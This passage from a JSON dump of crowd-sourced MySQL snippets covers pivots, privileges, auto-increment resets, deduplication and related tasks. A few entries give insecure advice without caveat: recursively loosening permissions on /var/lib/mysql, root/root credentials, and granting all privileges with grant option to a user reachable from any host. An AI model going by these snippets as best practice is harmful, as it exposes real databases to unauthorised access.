that you want to set up for  #  your new wordpressuser, always be sure to reload all the privileges.   FLUSH PRIVILEGES;\n",
    "reg_date": "2021-10-12T09:57:29.000Z"
  },
  {
    "id": 2301,
    "keyword": null,
    "link": null,
    "title": " mysql persistence.xml",
    "description": "<persistence-unit name=\"NewPersistenceUnit\">     <provider>org.eclipse.persistence.jpa.PersistenceProvider</provider>     <class>com.example.MyApp.models.ProductsEntity</class>     ...      <properties>         <property name=\"eclipselink.jdbc.url\" value=\"jdbc:mysql://localhost:3306/database\"/>         <property name=\"eclipselink.jdbc.driver\" value=\"com.mysql.jdbc.Driver\"/>         <property name=\"eclipselink.jdbc.user\" value=\"root\"/>         <property name=\"eclipselink.jdbc.password\" value=\"root\"/>     </properties> </persistence-unit>\n",
    "reg_date": "2021-10-12T09:57:29.000Z"
  },
  {
    "id": 2302,
    "keyword": null,
    "link": null,
    "title": " mysql pivot",
    "description": "SELECT          -- Total invoices per gender   sums.F AS \"Women\", sums.M AS \"Men\", sums.M + sums.F AS \"Total\" FROM (   SELECT     SUM( IF(gender='M', invoice, 0) ) As 'M',     SUM( IF(gender='F', invoice, 0) ) As 'F'   FROM sales ) AS sums; -- Table Sales: CREATE TABLE sales (     gender VARCHAR(1),      -- 'F' or 'M'     invoice NUMBER );\n",
    "reg_date": "2021-10-12T09:57:30.000Z"
  },
  {
    "id": 2303,
    "keyword": null,
    "link": null,
    "title": " mysql port",
    "description": "mysql -u root mysql> SHOW GLOBAL VARIABLES LIKE 'PORT'; # Default port is 3306 for MySQL\nThe default port for MySQL server is 3306\n",
    "reg_date": "2021-10-12T09:57:30.000Z"
  },
  {
    "id": 2304,
    "keyword": null,
    "link": null,
    "title": " mysql pretty date format",
    "description": "DATE_FORMAT(NOW(),'%M %e, %Y @ %h:%i %p')  #Format is 'June 10, 2014 @ 06:52 PM'\n",
    "reg_date": "2021-10-12T09:57:30.000Z"
  },
  {
    "id": 2305,
    "keyword": null,
    "link": null,
    "title": " mysql previous year",
    "description": "SELECT * FROM my_table WHERE YEAR(my_date) = YEAR(DATE_SUB(CURDATE(), INTERVAL 1 YEAR));\n",
    "reg_date": "2021-10-12T09:57:30.000Z"
  },
  {
    "id": 2306,
    "keyword": null,
    "link": null,
    "title": " mysql print variable",
    "description": "declare myvar INT default 0; SET myvar = 5; SELECT concat('myvar is ', myvar); \nPress CTRL+C to copy SHOW [GLOBAL | SESSION] VARIABLES     [LIKE 'pattern' | WHERE expr]\n",
    "reg_date": "2021-10-12T09:57:30.000Z"
  },
  {
    "id": 2307,
    "keyword": null,
    "link": null,
    "title": " mysql privileges",
    "description": "CREATE USER 'user'@'localhost' IDENTIFIED BY 'password'; GRANT ALL PRIVILEGES ON * . * TO 'user'@'localhost'; FLUSH PRIVILEGES;\nCREATE USER 'norris'@'localhost' IDENTIFIED BY 'password';\nGRANT ALL PRIVILEGES ON dbTest.* To 'user'@'hostname' IDENTIFIED BY 'password';\n/* The GRANT statement is used to assign full control over specific database by providing all priviledge. Follow below statement for assign priviledge to user */  Syntax:  GRANT ALL PRIVILEGES ON database_name.* TO 'username'@'localhost'; \n-- Grants / privileges list SELECT * FROM information_schema.user_privileges; SELECT CONCAT('SHOW GRANTS FOR ''',user,'''@''',host,''';') FROM mysql.user;  -- Grant a user /*  ALL PRIVILEGES  All privileges     CREATE          Create databases and tables     DROP            Drop databases and tables     DELETE          Delete rows from a specific table     INSERT          Insert rows into a specific table     SELECT          Read a database     UPDATE          Update table rows   */ GRANT SELECT, UPDATE ON db_name.table_name TO 'my_user'@'localhost'; GRANT SELECT ON *.* TO 'my_user'@'localhost'; GRANT ALL PRIVILEGES ON db_name.* TO 'my_user'@'localhost';  --Display user grants SHOW GRANTS FOR 'my_user'@'localhost';\ncreate user admin@localhost identified by 'admin123';\n",
    "reg_date": "2021-10-12T09:57:30.000Z"
  },
  {
    "id": 2308,
    "keyword": null,
    "link": null,
    "title": " mysql purge binary logs",
    "description": "# Enter mysql as root with mysql -u root PURGE BINARY LOGS BEFORE NOW();\n",
    "reg_date": "2021-10-12T09:57:30.000Z"
  },
  {
    "id": 2309,
    "keyword": null,
    "link": null,
    "title": " mysql query bulk insert",
    "description": "INSERT INTO tbl_name (a,b,c) VALUES(1,2,3),(4,5,6),(7,8,9); \n",
    "reg_date": "2021-10-12T09:57:30.000Z"
  },
  {
    "id": 2310,
    "keyword": null,
    "link": null,
    "title": " mysql query date year",
    "description": "SELECT book_name,dt_of_pub,YEAR(dt_of_pub) FROM book_mast WHERE YEAR(dt_of_pub)>2003;  \n",
    "reg_date": "2021-10-12T09:57:30.000Z"
  },
  {
    "id": 2311,
    "keyword": null,
    "link": null,
    "title": " mysql query dates between two dates",
    "description": "ex1: SELECT * FROM `objects`  WHERE  (date_field BETWEEN '2010-01-30 14:15:55' AND '2010-09-29 10:15:55')  ex2: WHERE     requireddate BETWEEN       CAST('2003-01-01' AS DATE) AND       CAST('2003-01-31' AS DATE);\nselect * from users  where signup_date between '2020-05-01' and '2020-12-10 23:59:59'; // Important with the times,  // otherwize you will not get all records from end date. // Event if you only have date and no times in signup_date column\n",
    "reg_date": "2021-10-12T09:57:30.000Z"
  },
  {
    "id": 2312,
    "keyword": null,
    "link": null,
    "title": " mysql query first character",
    "description": "SELECT author FROM lyrics WHERE author LIKE 'B%';\n",
    "reg_date": "2021-10-12T09:57:30.000Z"
  },
  {
    "id": 2313,
    "keyword": null,
    "link": null,
    "title": " mysql query return excel file",
    "description": "#Before exectue query in sql run following command: sudo chmod 755 -R /var/lib/mysql/  #run query in mysql SELECT ... FROM ... WHERE ...  INTO OUTFILE 'file.csv' FIELDS TERMINATED BY ',' OPTIONALLY ENCLOSED BY '\"' LINES TERMINATED BY '\\n';  #Then Open Excel and click on Data tab,  #Click the From Text/CSV button, #Navigate to the location of the exported .csv file and click Import #Choose appropriate delimiter \"comma\"and click Transform Data #Update column name, Close & Load. \n",
    "reg_date": "2021-10-12T09:57:31.000Z"
  },
  {
    "id": 2314,
    "keyword": null,
    "link": null,
    "title": " mysql query to check record exists in database table or not",
    "description": "-- Returns 1 if exists, 0 else SELECT EXISTS(SELECT 1 FROM my_table WHERE text LIKE '%something%');  SELECT  \tCASE  \t\tWHEN EXISTS(SELECT 1 FROM my_table WHERE text LIKE '%something%') = 1 THEN     \t\t'It exists'     \tELSE 'Does not exist' \tEND;\n",
    "reg_date": "2021-10-12T09:57:31.000Z"
  },
  {
    "id": 2315,
    "keyword": null,
    "link": null,
    "title": " mysql query unique column",
    "description": "SELECT DISTINCT(column_name) FROM your_table_name;  #You can select distinct values for one or more columns. The column names has to be separated with comma. SELECT DISTINCT column_name_1, column_name_2 FROM your_table_name;  \n",
    "reg_date": "2021-10-12T09:57:31.000Z"
  },
  {
    "id": 2316,
    "keyword": null,
    "link": null,
    "title": " mysql query where in",
    "description": "SELECT * FROM `tableName` WHERE `ColumnName` IN (1,2,3);\n",
    "reg_date": "2021-10-12T09:57:31.000Z"
  },
  {
    "id": 2317,
    "keyword": null,
    "link": null,
    "title": " mysql query with sql to get the next row",
    "description": "SELECT * FROM foo WHERE id = (SELECT MIN(id) FROM foo WHERE id > 4)\n",
    "reg_date": "2021-10-12T09:57:31.000Z"
  },
  {
    "id": 2318,
    "keyword": null,
    "link": null,
    "title": " mysql récupérer le code création de vue",
    "description": "SELECT VIEW_DEFINITION  FROM information_schema.VIEWS  WHERE TABLE_NAME = 'nom_de_la_vue'\n",
    "reg_date": "2021-10-12T09:57:31.000Z"
  },
  {
    "id": 2319,
    "keyword": null,
    "link": null,
    "title": " mysql random",
    "description": "SELECT name   FROM random AS r1 JOIN        (SELECT CEIL(RAND() *                      (SELECT MAX(id)                         FROM random)) AS id)         AS r2  WHERE r1.id >= r2.id  ORDER BY r1.id ASC  LIMIT 1\n",
    "reg_date": "2021-10-12T09:57:31.000Z"
  },
  {
    "id": 2320,
    "keyword": null,
    "link": null,
    "title": " mysql random limit 1",
    "description": "SELECT * FROM table_name ORDER BY RAND() LIMIT 1;\n",
    "reg_date": "2021-10-12T09:57:31.000Z"
  },
  {
    "id": 2321,
    "keyword": null,
    "link": null,
    "title": " mysql regex exact match",
    "description": "select * from user where first_name REGEXP '^john$';\n",
    "reg_date": "2021-10-12T09:57:31.000Z"
  },
  {
    "id": 2322,
    "keyword": null,
    "link": null,
    "title": " mysql regex replace",
    "description": "REGEXP_REPLACE(expression, pattern, replacement[, position[, occurrence[, match_type]]])  Example 1 - remove all \"-\" characters SELECT REGEXP_REPLACE( fieldname, '-', '' ) AS newfieldname FROM tablename\nWITH t AS (SELECT 'aaa <b>bbb</b> ccc' AS teststring FROM dual)  SELECT   teststring,   regexp_replace(teststring, '<.+>') AS reg1,   regexp_replace(teststring, '<.*>') AS reg2,   regexp_replace(teststring, '<.*?>') AS reg3 FROM t   TESTSTRING             REG1        REG2          REG3 aaa <b>bbb</b> ccc     aaa ccc     aaa ccc       aaa bbb ccc \nDELIMITER $$  CREATE FUNCTION  `regex_replace`(pattern VARCHAR(1000),replacement VARCHAR(1000),original VARCHAR(1000)) RETURNS VARCHAR(1000) DETERMINISTIC BEGIN   DECLARE temp VARCHAR(1000);   DECLARE ch VARCHAR(1);   DECLARE i INT;  SET i = 1;  SET temp = '';  IF original REGEXP pattern THEN    loop_label: LOOP     IF i>CHAR_LENGTH(original) THEN     LEAVE loop_label;      END IF;    SET ch = SUBSTRING(original,i,1);    IF NOT ch REGEXP pattern THEN     SET temp = CONCAT(temp,ch);    ELSE     SET temp = CONCAT(temp,replacement);    END IF;    SET i=i+1;   END LOOP;  ELSE   SET temp = original;  END IF;  RETURN temp; END$$  DELIMITER ;\n",
    "reg_date": "2021-10-12T09:57:31.000Z"
  },
  {
    "id": 2323,
    "keyword": null,
    "link": null,
    "title": " mysql regexp match word",
    "description": "SELECT * FROM table  WHERE keywords REGEXP '[[:<:]]rid[[:>:]]'\nselect * from user where first_name REGEXP '^john$';\n",
    "reg_date": "2021-10-12T09:57:32.000Z"
  },
  {
    "id": 2324,
    "keyword": null,
    "link": null,
    "title": " mysql relationships between tables",
    "description": "FOREIGN KEY (column) REFERENCES table(column) \n",
    "reg_date": "2021-10-12T09:57:32.000Z"
  },
  {
    "id": 2325,
    "keyword": null,
    "link": null,
    "title": " mysql release storage",
    "description": "OPTIMIZE TABLE [table]\n",
    "reg_date": "2021-10-12T09:57:32.000Z"
  },
  {
    "id": 2326,
    "keyword": null,
    "link": null,
    "title": " mysql remote connection command line",
    "description": "mysql --host=localhost --user=myname --password mydb\nmysql> CREATE USER 'monty'@'localhost' IDENTIFIED BY 'some_pass'; mysql> GRANT ALL PRIVILEGES ON *.* TO 'monty'@'localhost'     ->     WITH GRANT OPTION; mysql> CREATE USER 'monty'@'%' IDENTIFIED BY 'some_pass'; mysql> GRANT ALL PRIVILEGES ON *.* TO 'monty'@'%'     ->     WITH GRANT OPTION; \n",
    "reg_date": "2021-10-12T09:57:32.000Z"
  },
  {
    "id": 2327,
    "keyword": null,
    "link": null,
    "title": " mysql remove auto increment",
    "description": "ALTER TABLE mytable CHANGE my_col my_col INT(10) UNSIGNED NOT NULL\nset @autoid :=0;  update Table_Name set AutoIncremented_Column = @autoid := (@autoid+1); alter table Table_Name Auto_Increment = 1;  @Zenonymous\n",
    "reg_date": "2021-10-12T09:57:32.000Z"
  },
  {
    "id": 2328,
    "keyword": null,
    "link": null,
    "title": " mysql remove database",
    "description": " DROP DATABASE dbname;\nDROP DATABASE ma_base\nDROP DATABASE dbname\nmysql> drop database `my-database`; \nDROP DATABASE databasename\nmysql> drop database <db_name>;\n",
    "reg_date": "2021-10-12T09:57:32.000Z"
  },
  {
    "id": 2329,
    "keyword": null,
    "link": null,
    "title": " mysql remove duplicates",
    "description": "DELETE t1 FROM subscriptions t1 INNER JOIN subscriptions t2  WHERE      t1.id < t2.id AND      t1.user_id = t2.user_id AND t1.name = t2.name\nDELETE FROM table_name WHERE id         NOT IN ( SELECT id FROM table_name                     GROUP BY field_1, field_2)\nDELETE c1 FROM contacts c1 INNER JOIN contacts c2  WHERE     c1.id > c2.id AND      c1.email = c2.email;\nDELETE FROM CONTACTS WHERE ID NOT IN       (SELECT *        FROM (SELECT max(ID)\t\t              FROM CONTACTS              GROUP BY EMAIL) t);  -- &dArr; Test it &dArr; (Fiddle source link)\nSELECT      col1, COUNT(col1),     col2, COUNT(col2) FROM     table_name GROUP BY      col1,      col2 HAVING         (COUNT(col1) > 1) AND         (COUNT(col2) > 1); \nDELETE t1 FROM contacts t1 INNER JOIN contacts t2  WHERE      t1.id < t2.id AND      t1.email = t2.email;Code language: SQL (Structured Query Language) (sql)\n",
    "reg_date": "2021-10-12T09:57:32.000Z"
  },
  {
    "id": 2330,
    "keyword": null,
    "link": null,
    "title": " mysql remove foreign key constraint",
    "description": "-- On Create CREATE TABLE tableName (     ID INT,     SomeEntityID INT,     PRIMARY KEY (ID),     FOREIGN KEY (SomeEntityID)         REFERENCES SomeEntityTable(ID)         ON DELETE CASCADE );  -- On Alter, if the column already exists but has no FK ALTER TABLE   tableName ADD   FOREIGN KEY (SomeEntityID) REFERENCES SomeEntityTable(ID) ON DELETE CASCADE;     -- Add FK with a specific name  -- On Alter, if the column already exists but has no FK ALTER TABLE   tableName ADD CONSTRAINT fk_name   FOREIGN KEY (SomeEntityID) REFERENCES SomeEntityTable(ID) ON DELETE CASCADE;\nALTER TABLE jobs DROP FOREIGN KEY constraint_name \nSET foreign_key_checks = 0;\nCREATE TABLE parent (     id INT NOT NULL,     PRIMARY KEY (id) ) ENGINE=INNODB;  CREATE TABLE child (     id INT,     parent_id INT,     INDEX par_ind (parent_id),     FOREIGN KEY (parent_id)         REFERENCES parent(id)         ON DELETE CASCADE ) ENGINE=INNODB;\nALTER TABLE table_name DROP FOREIGN KEY constraint_name \n ALTER TABLE Orders  DROP FOREIGN KEY FK_PersonOrder; \n",
    "reg_date": "2021-10-12T09:57:32.000Z"
  },
  {
    "id": 2331,
    "keyword": null,
    "link": null,
    "title": " mysql remove last character",
    "description": "LEFT(col,length(col)-1) \n",
    "reg_date": "2021-10-12T09:57:32.000Z"
  },
  {
    "id": 2332,
    "keyword": null,
    "link": null,
    "title": " mysql remove last empty newline",
    "description": "update mytable SET title = TRIM(TRAILING '\\n' FROM title)\n",
    "reg_date": "2021-10-12T09:57:32.000Z"
  },
  {
    "id": 2333,
    "keyword": null,
    "link": null,
    "title": " mysql remove only full group by permanently",
    "description": "mysql > SET GLOBAL sql_mode=(SELECT REPLACE(@@sql_mode,'ONLY_FULL_GROUP_BY',''));\nsudo nano /etc/mysql/mysql.conf.d/mysqld.cnf [mysqld] # Add this line in last  #----------------------- sql_mode=STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_ENGINE_SUBSTITUTION #-----------------------  #Save file and exit sudo systemctl restart mysql\n",
    "reg_date": "2021-10-12T09:57:32.000Z"
  },
  {
    "id": 2334,
    "keyword": null,
    "link": null,
    "title": " mysql remove records",
    "description": "DELETE FROM table_name WHERE condition;\n",
    "reg_date": "2021-10-12T09:57:32.000Z"
  },
  {
    "id": 2335,
    "keyword": null,
    "link": null,
    "title": " mysql remove ubuntu",
    "description": "apt-get --purge remove \"mysql*\"\n",
    "reg_date": "2021-10-12T09:57:33.000Z"
  },
  {
    "id": 2336,
    "keyword": null,
    "link": null,
    "title": " mysql remove unique constraint",
    "description": "ALTER TABLE tbl_name DROP INDEX index_name\nALTER TABLE mytable DROP INDEX key_Name;\nDROP INDEX index_name ON tbl_name\n",
    "reg_date": "2021-10-12T09:57:33.000Z"
  },
  {
    "id": 2337,
    "keyword": null,
    "link": null,
    "title": " mysql remove user privileges",
    "description": "DROP USER 'jeffrey'@'localhost';\nREVOKE ALL ON dbname.* FROM 'username'@'localhost';\nDROP USER IF EXISTS 'user'@'127.0.0.1' ;\nREVOKE ALL PRIVILEGES ON database_name.* FROM 'username'@'host'; OR  DROP USER 'username'@'host';\nDROP USER 'jeffrey'@'localhost';  FOR DELETING USER \n",
    "reg_date": "2021-10-12T09:57:33.000Z"
  },
  {
    "id": 2338,
    "keyword": null,
    "link": null,
    "title": " mysql repair a table",
    "description": "REPAIR TABLE mytablename\n",
    "reg_date": "2021-10-12T09:57:33.000Z"
  },
  {
    "id": 2339,
    "keyword": null,
    "link": null,
    "title": " mysql replace",
    "description": "UPDATE users SET first_name = REPLACE (first_name, 'search', 'replace_with') where id > 0;\nUPDATE     table_name SET     column_name = REPLACE(column_name, 'text to find', 'text to replace with') WHERE     column_name LIKE '%text to find%';\nREPLACE(str, find_string, replace_with) \nUPDATE `table` SET `column` = replace(`column`, 'find text', 'replace text')\nUPDATE products  SET      productDescription = REPLACE(productDescription,         'abuot',         'about');\nThe MySQL REPLACE statement is an extension to the SQL Standard. The MySQL REPLACE statement works as follows:  Step 1. Insert a new row into the table, if a duplicate key error occurs.  Step 2. If the insertion fails due to a duplicate-key error occurs:  Delete the conflicting row that causes the duplicate key error from the table. Insert the new row into the table again. To determine whether the new row that already exists in the table, MySQL uses PRIMARY KEY or UNIQUE KEY index. If the table does not have one of these indexes, the REPLACE works like an  INSERT statement.  To use the REPLACE statement, you need to have at least both INSERT and DELETE privileges for the table.  Notice that MySQL has the REPLACE string function which is not the REPLACE statement covered in this tutorial.  The following illustrates the syntax of the REPLACE statement:  REPLACE [INTO] table_name(column_list) VALUES(value_list);\n",
    "reg_date": "2021-10-12T09:57:33.000Z"
  },
  {
    "id": 2340,
    "keyword": null,
    "link": null,
    "title": " mysql replace string in table",
    "description": "UPDATE products  SET      productDescription = REPLACE(productDescription,         'abuot',         'about');\n",
    "reg_date": "2021-10-12T09:57:33.000Z"
  },
  {
    "id": 2341,
    "keyword": null,
    "link": null,
    "title": " mysql replace text",
    "description": "UPDATE users SET first_name = REPLACE (first_name, 'search', 'replace_with') where id > 0;\nUPDATE     table_name SET     column_name = REPLACE(column_name, 'text to find', 'text to replace with') WHERE     column_name LIKE '%text to find%';\nREPLACE(str, find_string, replace_with) \nUPDATE products  SET      productDescription = REPLACE(productDescription,         'abuot',         'about');\nUPDATE products SET  productDescription = REPLACE(productDescription,'abuot','about');\n#REPLACE(string, from_string, new_string) SELECT REPLACE(myText, \"a\", \"b\") as myText FROM tableText;\n",
    "reg_date": "2021-10-12T09:57:33.000Z"
  },
  {
    "id": 2342,
    "keyword": null,
    "link": null,
    "title": " mysql reset auto increment",
    "description": "ALTER TABLE table_name AUTO_INCREMENT = 1;\nALTER TABLE `Table Name` AUTO_INCREMENT = 1;\nALTER TABLE tablename AUTO_INCREMENT = 1\nSET  @num := 0;  UPDATE your_table SET id = @num := (@num+1);  ALTER TABLE your_table AUTO_INCREMENT =1;\nALTER SEQUENCE users_id_seq RESTART WITH 1; #\t\t\t\t|     | #            TABLE  COLUMN\nset @autoid :=0;  update Table_Name set AutoIncremented_Column = @autoid := (@autoid+1); alter table Table_Name Auto_Increment = 1;  @Zenonymous\n",
    "reg_date": "2021-10-12T09:57:33.000Z"
  },
  {
    "id": 2343,
    "keyword": null,
    "link": null,
    "title": " mysql reset auto increment id",
    "description": "ALTER TABLE table_name AUTO_INCREMENT = 1;\nALTER TABLE `Table Name` AUTO_INCREMENT = 1;\nSET  @num := 0;  UPDATE your_table SET id = @num := (@num+1);  ALTER TABLE your_table AUTO_INCREMENT =1;\n",
    "reg_date": "2021-10-12T09:57:33.000Z"
  },
  {
    "id": 2344,
    "keyword": null,
    "link": null,
    "title": " mysql reset auto increment to 1",
    "description": "ALTER TABLE table_name AUTO_INCREMENT = 1;\nALTER TABLE tablename AUTO_INCREMENT = 1\nSET  @num := 0;  UPDATE your_table SET id = @num := (@num+1);  ALTER TABLE your_table AUTO_INCREMENT =1;\nALTER SEQUENCE users_id_seq RESTART WITH 1; #\t\t\t\t|     | #            TABLE  COLUMN\n",
    "reg_date": "2021-10-12T09:57:33.000Z"
  },
  {
    "id": 2345,
    "keyword": null,
    "link": null,
    "title": " mysql reset auto increment value",
    "description": "ALTER TABLE table_name AUTO_INCREMENT = 1;\n",
    "reg_date": "2021-10-12T09:57:34.000Z"
  },
  {
    "id": 2346,
    "keyword": null,
    "link": null,
    "title": " mysql restore database",
    "description": "mysql -u [user] -p [database_name] < [filename].sql\n",
    "reg_date": "2021-10-12T09:57:34.000Z"
  },
  {
    "id": 2347,
    "keyword": null,
    "link": null,
    "title": " mysql return 0 if null",
    "description": "SELECT IFNULL(field, 0) AS field FROM products WHERE id = 1  SELECT IFNULL(SUM(field), 0) as field FROM products\nSELECT IF((SELECT CASE WHEN 1>0 THEN 'true' ELSE 'false' END),'true','false');  \n",
    "reg_date": "2021-10-12T09:57:34.000Z"
  },
  {
    "id": 2348,
    "keyword": null,
    "link": null,
    "title": " mysql return if it contains",
    "description": "SELECT * FROM Accounts WHERE Username LIKE '%query%'\n",
    "reg_date": "2021-10-12T09:57:34.000Z"
  },
  {
    "id": 2349,
    "keyword": null,
    "link": null,
    "title": " mysql return statement",
    "description": "RETURN result;\n",
    "reg_date": "2021-10-12T09:57:34.000Z"
  },
  {
    "id": 2350,
    "keyword": null,
    "link": null,
    "title": " mysql root access denied",
    "description": "sudo mysql  ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'root'; \nUPDATE mysql.user SET plugin = 'mysql_native_password' WHERE user = 'root' AND plugin = 'unix_socket'; FLUSH PRIVILEGES; \n## ADD user in mysql && have problem with root user ##  # First Login mysql shell.. sudo mysql -u root -p   ## Also check if you are unable to login in mysql without sudo...  ## Creating new user and giving permissions... # Goto login shell of mysql... and type below commands...  #1 show databases; #2 use mysql; #3 select user, host, plugin from mysql.user; #4 create user 'your_user_name'@'localhost' identified by 'password'; #5 grant all privileges on *.* to 'your_user_name'@'localhost'; #6 update user set plugin=\"caching_sha2_password\" where User=\"your_user_name\"; \t#     .... Here caching_sha2_password you can see yours in #3 check  \t#\t\tyour table and see column (plugin) don't use root plugin... #7 flush privileges; #8 EXIT  #### DONE Now you created your user also you can user without sudo...  mysql -u your_user_name -p  ## For password check your step #4 and enter same password...  ## Enjoy ALL DONE.... ## HAVE A NICE DAY!\nGRANT ALL ON *.* TO 'user'@'localhost' with GRANT OPTION; \n",
    "reg_date": "2021-10-12T09:57:34.000Z"
  },
  {
    "id": 2351,
    "keyword": null,
    "link": null,
    "title": " mysql root localhost run",
    "description": "mysql -u root mysql\n",
    "reg_date": "2021-10-12T09:57:34.000Z"
  },
  {
    "id": 2352,
    "keyword": null,
    "link": null,
    "title": " mysql root permission denied lost",
    "description": "GRANT ALL ON *.* TO 'user'@'localhost' with GRANT OPTION; \n",
    "reg_date": "2021-10-12T09:57:34.000Z"
  },
  {
    "id": 2353,
    "keyword": null,
    "link": null,
    "title": " mysql row number() example",
    "description": "SELECT row_number() over ( order by firstName) RowNumberSqeuence,FirstName from rowNumberDemo  order by FirstName;\n                                     set @row_number := 0;  SELECT      @row_number:=CASE         WHEN @customer_no = customerNumber  \t\t\tTHEN @row_number + 1         ELSE 1     END AS num,     @customer_no:=customerNumber customerNumber,     paymentDate,     amount FROM     payments ORDER BY customerNumber;\nSET @row_number = 0;  SELECT      (@row_number:=@row_number + 1) AS num,      firstName,      lastName FROM     employees ORDER BY firstName, lastName     LIMIT 5;\n",
    "reg_date": "2021-10-12T09:57:34.000Z"
  },
  {
    "id": 2354,
    "keyword": null,
    "link": null,
    "title": " mysql run sql file",
    "description": "mysql> source \\home\\user\\Desktop\\test.sql;\nmysql -u yourusername -p yourpassword yourdatabase < text_file\n mysql> use db_name;  mysql> source file_name.sql;\nCopied shell> mysql db_name < text_file\nCopied mysql> source file_name mysql> \\. file_name\nExecute SQl File in MySQL\n",
    "reg_date": "2021-10-12T09:57:34.000Z"
  },
  {
    "id": 2355,
    "keyword": null,
    "link": null,
    "title": " mysql safe mode",
    "description": "SET SQL_SAFE_UPDATES = 0;\nSET SQL_SAFE_UPDATES = 0; \nsql safe mode\nUPDATE tablename SET columnname=1;\n",
    "reg_date": "2021-10-12T09:57:35.000Z"
  },
  {
    "id": 2356,
    "keyword": null,
    "link": null,
    "title": " mysql search for column name in all tables",
    "description": "SELECT DISTINCT TABLE_NAME, COLUMN_NAME  FROM INFORMATION_SCHEMA.COLUMNS WHERE COLUMN_NAME LIKE '%partial_column_name%'     AND TABLE_SCHEMA='YourDatabase';\nSELECT DISTINCT TABLE_NAME      FROM INFORMATION_SCHEMA.COLUMNS     WHERE COLUMN_NAME IN ('columnA','ColumnB')         AND TABLE_SCHEMA='YourDatabase';\n",
    "reg_date": "2021-10-12T09:57:35.000Z"
  },
  {
    "id": 2357,
    "keyword": null,
    "link": null,
    "title": " mysql see users and passwords",
    "description": "select * from mysql.user; #or for less data select user, host from mysql.user;\nSELECT User, Host, Password, password_expired FROM mysql.user;\n",
    "reg_date": "2021-10-12T09:57:35.000Z"
  },
  {
    "id": 2358,
    "keyword": null,
    "link": null,
    "title": " mysql select all table that have field names",
    "description": "SELECT DISTINCT \tTABLE_NAME FROM \tINFORMATION_SCHEMA.COLUMNS WHERE \tCOLUMN_NAME IN('column1', 'column2') \tAND TABLE_SCHEMA = 'schema_name'; \n",
    "reg_date": "2021-10-12T09:57:35.000Z"
  },
  {
    "id": 2359,
    "keyword": null,
    "link": null,
    "title": " mysql select and count left join",
    "description": "select   t.Topic,   t.Title,   count(distinct s.starID) as StarCount,   count(distinct m.User) as UserCount,   count(distinct m.messageID) as MessageCount from   Topics t   left join Messages m ON m.Topic = t.Topic   left join Stars_Given s ON s.Topic = t.Topic group by   t.Topic,   t.Title\n",
    "reg_date": "2021-10-12T09:57:35.000Z"
  },
  {
    "id": 2360,
    "keyword": null,
    "link": null,
    "title": " mysql select another database",
    "description": "# databasename.tablename  INSERT INTO db1.myday (id, name) SELECT kode, nama FROM db2.youday\n",
    "reg_date": "2021-10-12T09:57:35.000Z"
  },
  {
    "id": 2361,
    "keyword": null,
    "link": null,
    "title": " mysql select count",
    "description": "SELECT COUNT(*) FROM count_demos;\nSelect Count(*) from Count_test.dbtest ;\nselect table_name, sum(table_rows) as sum  from information_schema.tables where table_schema = '[DB NAME]' group by table_name  order by sum desc;\nSELECT sum( case when `tags_Column` CONTAINS 'tag2' then 1 else 0 end ) as tag2,        sum( case when `tags_Column` CONTAINS 'tag3' then 1 else 0 end ) as tag3,        .....        sum( case when `tags_Column` CONTAINS 'tag256' then 1 else 0 end ) as tag256,        sum( case when `tags_Column` CONTAINS `tag2` OR                        `tags_Column` CONTAINS 'tag3`             then 0 else 1 end ) as doesnt_contains_tags_2_3 FROM `TableContainsTags`\n",
    "reg_date": "2021-10-12T09:57:35.000Z"
  },
  {
    "id": 2362,
    "keyword": null,
    "link": null,
    "title": " mysql select database",
    "description": "SHOW TABLES from <databasename>;\nSELECT column_name(s) FROM table_name\n                  USE database_name; Code language: SQL (Structured Query Language) (sql)\nCREATE DATABASE [IF NOT EXISTS] database_name [CHARACTER SET charset_name] [COLLATE collation_name] \nselect * from table_name\n//SELECT Database is used in MySQL to select a particular database to work with. This query is used when multiple databases are available with MySQL Server.  //You can use SQL command USE to select a particular database.  Syntax: USE database_name;  //suppose database name is employee  use employee;\n",
    "reg_date": "2021-10-12T09:57:35.000Z"
  },
  {
    "id": 2363,
    "keyword": null,
    "link": null,
    "title": " mysql select date from datetime",
    "description": "WHERE DATE(datetime) = '2009-10-20'\n",
    "reg_date": "2021-10-12T09:57:35.000Z"
  },
  {
    "id": 2364,
    "keyword": null,
    "link": null,
    "title": " mysql select default if null",
    "description": "IFNULL(MAX(EMAIL), \"example@google.com\") as email\n",
    "reg_date": "2021-10-12T09:57:35.000Z"
  },
  {
    "id": 2365,
    "keyword": null,
    "link": null,
    "title": " mysql select distinct date from timestamp",
    "description": "SELECT DISTINCT(DATE(<your_column>)) FROM <your_table>;\n",
    "reg_date": "2021-10-12T09:57:36.000Z"
  },
  {
    "id": 2366,
    "keyword": null,
    "link": null,
    "title": " mysql select distinct rows",
    "description": "When querying data from a table, you may get duplicate rows. In order to remove these duplicate rows, you use the DISTINCT clause in the SELECT statement.  Here is the syntax of the DISTINCT clause:  SELECT DISTINCT     select_list FROM     table_name;\nSELECT DISTINCT Column_name FROM table_name;\nSELECT DISTINCT location FROM users; \n",
    "reg_date": "2021-10-12T09:57:36.000Z"
  },
  {
    "id": 2367,
    "keyword": null,
    "link": null,
    "title": " mysql select field if condition",
    "description": "select IF('fieldname with condition','if true value','if false value') from table_name where 1;\n",
    "reg_date": "2021-10-12T09:57:36.000Z"
  },
  {
    "id": 2368,
    "keyword": null,
    "link": null,
    "title": " mysql select from outside",
    "description": "mysql -h host -u root -proot -e \"show databases;\"; \n",
    "reg_date": "2021-10-12T09:57:36.000Z"
  },
  {
    "id": 2369,
    "keyword": null,
    "link": null,
    "title": " mysql select greater than yesterday",
    "description": "SELECT * FROM my_table WHERE created_at > DATE_SUB(NOW(), INTERVAL 1 DAY)\n",
    "reg_date": "2021-10-12T09:57:36.000Z"
  },
  {
    "id": 2370,
    "keyword": null,
    "link": null,
    "title": " mysql select if empty result",
    "description": "SELECT IFNULL( (SELECT field1 FROM table WHERE id = 123 LIMIT 1) ,'not found'); \n",
    "reg_date": "2021-10-12T09:57:36.000Z"
  },
  {
    "id": 2371,
    "keyword": null,
    "link": null,
    "title": " mysql select if zero",
    "description": "SELECT IF((SELECT CASE WHEN 1>0 THEN 'true' ELSE 'false' END),'true','false');  \n",
    "reg_date": "2021-10-12T09:57:36.000Z"
  },
  {
    "id": 2372,
    "keyword": null,
    "link": null,
    "title": " mysql select inside sum",
